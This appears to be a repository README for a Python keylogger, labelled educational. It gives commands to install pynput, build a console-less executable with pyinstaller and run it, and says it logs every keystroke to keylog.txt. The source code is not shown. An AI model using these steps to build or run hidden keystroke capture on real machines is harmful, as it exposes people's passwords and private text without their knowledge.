# Key Logger
> ***FOR EDUCATIONAL PURPOSES ONLY***

> A simple key logger that logs all the keys pressed by the user and saves them in a text file.

## Installation

### 1. Clone the repository
```bash
git clone https://github.com/TienNHM/key_logger.git
```

### 2. Install the required packages
```bash
pip install pynput
pip install pyinstaller
```

### 3. Build the executable file
```bash
pyinstaller --onefile --noconsole key_logger.py
```

### 4. Run the executable file
```bash
dist/key_logger.exe
```

## Usage
- The key logger will start logging all the keys pressed by the user and save them in a text file named `keylog.txt`.
- To stop the key logger, open the task manager and end the process `key_logger.exe`.